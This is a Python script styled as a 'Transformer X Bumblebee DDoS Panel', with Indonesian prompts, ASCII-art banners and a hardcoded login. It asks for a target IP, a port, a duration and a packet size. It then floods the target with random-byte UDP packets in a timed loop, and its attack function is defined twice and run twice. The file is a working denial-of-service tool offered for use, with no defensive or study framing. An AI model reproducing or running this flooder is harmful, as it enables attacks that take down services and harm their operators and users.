import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print(""""\033[94m
 ██▓ ██▒   █▓ ▄▄▄       ███▄    █ 
▓██▒▓██░   █▒▒████▄     ██ ▀█   █ 
▒██▒ ▓██  █▒░▒██  ▀█▄  ▓██  ▀█ ██▒
░██░  ▒██ █░░░██▄▄▄▄██ ▓██▒  ▐▌██▒
░██░   ▒▀█░   ▓█   ▓██▒▒██░   ▓██░
░▓     ░ ▐░   ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ▒ ░   ░ ░░    ▒   ▒▒ ░░ ░░   ░ ▒░
 ▒ ░     ░░    ░   ▒      ░   ░ ░ 
 ░        ░        ░  ░         ░ 
         ░                        

""")

username = str(input("\033[94m[IVANC2] \033[93mUsername:"))
password = str(input("\033[94m[IVANC2] \033[93mPassword:"))
if password == "TransformerXIvan" and username == "TransformerXIvan":
    print ("Telah Masuk Sebagai TransformerXIvan")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("\033[92mConnecting To Server [\033[97m•\033[92m]")
time.sleep(0.5)


nicknm = "TransformerXIvan"

mt = """\033[96mUnder \033[0;93mmaintance"""

os.system("clear")

print("""\033[94m
 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
_¶¶___________________________________¶¶
_¶¶___________________________________¶¶
__¶¶_________________________________¶¶_
__¶¶_________________________________¶¶_
___¶¶_______________________________¶¶__
___¶¶______________________________¶¶___
____¶¶¶__________________________¶¶¶____
_____¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_____
_______¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_______
_________¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_________
___________¶¶¶¶¶_¶¶¶¶¶¶¶_¶¶¶¶___________
______________¶¶¶¶_¶¶¶_¶¶¶______________
________________¶¶¶_¶_¶¶________________
_________________¶¶¶_¶¶_________________
__________________¶¶_¶¶_________________
__________________¶¶_¶__________________
__________________¶¶_¶¶_________________
________________¶¶¶_¶_¶¶¶_______________
_____________¶¶¶¶¶__¶__¶¶¶¶¶____________
__________¶¶¶¶¶_____¶_____¶¶¶¶__________
________¶¶¶¶________¶_______¶¶¶¶¶_______
_______¶¶¶__________¶__________¶¶¶¶_____
_____¶¶¶____________¶____________¶¶¶____
____¶¶¶_____________¶______________¶¶___
___¶¶¶______________¶_______________¶¶__
___¶¶_______________¶________________¶¶_
__¶¶________________¶________________¶¶_
__¶¶_______________¶¶¶________________¶_
__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
""")


ip = str(input("\033[91m====> ★ Masukan IP/Host Target   : "))
port = int(input("\033[91m====> $ Masukan PORT Target   : "))
time = int(input("\033[91m====> $ Masukan Jumlah PACKET   : "))
threads = int(input("\033[91m====> $ Maskan Jumlah THREADS   : "))

os.system("clear")

brand = """\033[94m
\x1b[38;2;0;212;14m.▄▄ ·\x1b[38;2;0;186;45m ▄▄▄▄▄ ▄▄▄·\x1b[38;2;0;150;88m  ▐ ▄ ▄▄\x1b[38;2;0;113;133m▌  ▄▄▄ .\x1b[38;2;0;83;168m ▄· ▄▌
                        \x1b[38;2;0;212;14m▐█ ▀.\x1b[38;2;0;186;45m •██  ▐█ ▀█\x1b[38;2;0;150;88m •█▌▐███\x1b[38;2;0;113;133m•  ▀▄.▀·\x1b[38;2;0;83;168m▐█▪██▌
                        \x1b[38;2;0;212;14m▄▀▀▀█\x1b[38;2;0;186;45m▄ ▐█.▪▄█▀▀█\x1b[38;2;0;150;88m ▐█▐▐▌██\x1b[38;2;0;113;133m▪  ▐▀▀▪▄\x1b[38;2;0;83;168m▐█▌▐█▪
                        \x1b[38;2;0;212;14m▐█▄▪▐\x1b[38;2;0;186;45m█ ▐█▌·▐█ ▪▐\x1b[38;2;0;150;88m▌██▐█▌▐█\x1b[38;2;0;113;133m▌▐▌▐█▄▄▌\x1b[38;2;0;83;168m▐█▀·.
                        \x1b[38;2;0;212;14m ▀▀▀▀\x1b[38;2;0;186;45m  ▀▀▀  ▀  ▀\x1b[38;2;0;150;88m ▀▀ █▪.▀\x1b[38;2;0;113;133m▀▀  ▀▀▀ \x1b[38;2;0;83;168m  ▀ • 
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║       \x1b[38;2;239;239;239mWelcome to Transformer X Bumblebee DDoS Panel      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - -   \x1b[38;2;239;239;239mThe best free panel on github  \x1b[38;2;0;212;14m- - - \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║  \x1b[38;2;239;239;239mhttps://github.com/TransformerXSectroll/SectrollXZheroC2  \x1b[38;2;0;49;147m
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239mType [help] to see the SectrollXZheroC2 commands.   \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝

\033[91m     PUNYA TransformerXIvan🌹TransformerXIvan
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI TransformerXIvan EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(55055, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI TransformerXIvan EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(55055, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')